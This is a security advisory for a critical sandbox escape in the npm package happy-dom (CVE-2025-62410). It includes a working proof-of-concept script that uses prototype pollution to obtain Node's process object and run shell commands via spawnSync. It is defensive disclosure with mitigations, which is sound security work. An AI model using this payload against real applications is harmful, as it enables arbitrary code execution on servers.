# [C] happy-dom's `--disallow-code-generation-from-strings` is not sufficient for isolating untrusted JavaScript

## Summary
Severity: Critical
Advisory: GHSA-qpm2-6cq5-7pq5
CVE: CVE-2025-62410
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2025-10-15
Source: https://github.com/advisories/GHSA-qpm2-6cq5-7pq5
Type: github-advisory

## Affected
- npm: `happy-dom` — affected >=19.0.0 <20.0.2

## Details
### Summary
The mitigation proposed in GHSA-37j7-fg3j-429f for disabling eval/Function when executing untrusted code in happy-dom does not suffice, since it still allows prototype pollution payloads.

### Details
The untrusted script and the rest of the application still run in the same Isolate/process, so attackers can deploy prototype pollution payloads to hijack important references like "process" in the example below, or to hijack control flow via flipping checks of undefined property. There might be other payloads that allow the manipulation of require, e.g., via (univeral) gadgets (https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf).

### PoC
Attackers can pollute builtins like Object.prototype.hasOwnProperty() to obtain important references at runtime, e.g., "process". In this way, attackers might be able to execute arbitrary commands like in the example below via spawn().

```js
import { Browser } from "happy-dom";

const browser = new Browser({settings: {enableJavaScriptEvaluation: true}});
const page = browser.newPage({console: true});

page.url = 'https://example.com';
let payload = 'spawn_sync = process.binding(`spawn_sync`);normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};'
page.content = `<html>
<script>
    function f() { let process = this; ${payload}; spawnSync("touch", ["success.flag"]); return "success";} 
    this.constructor.constructor.__proto__.__proto__.toString = f;
    this.constructor.constructor.__proto__.__proto__.hasOwnProperty = f;
    // Other methods that can be abused this way: isPrototypeOf, propertyIsEnumerable, valueOf
    
</script>
<body>Hello world!</body></html>`;

await browser.close();
console.log(`The process object is ${process}`);
console.log(process.hasOwnProperty('spawn'));
```

### Impact
Arbitrary code execution via breaking out of the Node.js' vm isolation.

### Recommended Immediate Actions
Users can freeze the builtins in the global scope to defend against attacks similar to the PoC above. However, the untrusted code might still be able to retrieve all kind of information available in the global scope and exfiltrate them via fetch(), even without prototype pollution capabilities. Not to mention side channels caused by the shared process/isolate. Migration to [isolated-vm](https://github.com/laverdet/isolated-vm) is suggested instead.

Cris from the Endor Labs Security Research Team, who has worked extensively on JavaScript sandboxing in the past, submitted this advisory.

## References
- https://github.com/capricorn86/happy-dom/security/advisories/GHSA-qpm2-6cq5-7pq5
- https://nvd.nist.gov/vuln/detail/CVE-2025-62410
- https://github.com/capricorn86/happy-dom/commit/f4bd4ebe3fe5abd2be2bcea1c07043c8b0b70eea
- https://github.com/capricorn86/happy-dom
